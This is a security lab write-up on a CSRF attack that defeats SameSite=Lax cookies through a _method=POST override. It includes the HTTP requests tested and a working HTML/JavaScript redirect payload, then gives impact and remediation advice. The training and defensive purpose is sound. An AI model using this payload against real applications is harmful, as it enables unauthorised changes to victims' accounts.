# Lab 03 - SameSite Lax Bypass via Method Override

Topic: Browser cookie behaviour and unsafe method override  
Focus: understanding how `SameSite=Lax` can be bypassed when the backend accepts `_method=POST`

## Goal

Use a CSRF attack in a legal lab environment to change the victim's email address despite SameSite `Lax` cookie behaviour.

## Input I Controlled

The controlled inputs were:

- the `email` query parameter,
- the `_method` query parameter,
- the redirect URL hosted on the exploit server.

## What Happened

The normal email change request used `POST`:

```http
POST /my-account/change-email
Cookie: session=...

email=wiener1%40normal-user.net
```

A direct `GET` request did not work:

```http
GET /my-account/change-email?email=test-lax-1%40example.com
```

The server responded:

```http
405 Method Not Allowed
Allow: POST
```

Then I tested method override:

```http
GET /my-account/change-email?email=test-lax-2%40example.com&_method=POST
```

This returned:

```http
302 Found
Location: /my-account?id=wiener
```

The email changed, which showed that the backend accepted `_method=POST`.

The final exploit used a top-level navigation:

```html
<html>
  <body>
    <script>
      document.location = "https://LAB-HOST/my-account/change-email?email=samesite-lax-92831@example.com&_method=POST";
    </script>
  </body>
</html>
```

## What I Learned

SameSite `Lax` does not mean "CSRF is impossible".

With `SameSite=Lax`, browsers may send cookies during top-level `GET` navigations. If the backend then treats that `GET` as a `POST` because of `_method=POST`, the attacker can trigger a state-changing action.

The key difference is:

- browser sees a top-level `GET`,
- backend treats the request as `POST`.

## Impact

In a real application, unsafe method override could allow an attacker to bypass expected SameSite `Lax` behaviour and perform state-changing actions as the victim.

The impact depends on the endpoint. For account settings, it could lead to unwanted account changes.

## Remediation Summary

See `../csrf-samesite-overview.md` for the general remediation section.

Specific to this lab:

- do not allow method override on sensitive state-changing endpoints,
- require proper CSRF tokens even when SameSite cookies are used,
- avoid state changes via top-level `GET` navigation,
- treat SameSite as defence-in-depth, not a replacement for CSRF tokens,
- review framework-level method override behaviour.

## Main Takeaway

SameSite `Lax` helps, but it is not a full CSRF defence. Backend behaviour such as method override can turn a browser-allowed `GET` navigation into a state-changing action.
